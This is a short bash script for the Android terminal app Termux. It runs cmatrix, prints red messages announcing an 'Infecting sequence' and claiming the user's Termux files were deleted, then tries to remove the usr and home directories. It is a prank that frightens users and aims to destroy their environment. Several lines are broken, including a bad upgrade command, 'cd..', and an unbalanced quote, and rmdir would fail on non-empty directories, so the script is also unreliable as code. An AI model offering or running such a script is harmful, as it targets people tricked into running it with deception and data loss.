#!/bin/bash
pkg update && upgrade
pkg install cmatrix && cmatrix 
echo "Infecting sequence activated"
sleep 1
cd
cd..
printf '\033[31m';echo "Infecting sequence finished""
printf '\033[31m';echo "Deleted the files of termux"
printf '\033[31m';echo "Your termux is dead..."
sleep 2
rmdir usr
rmdir home
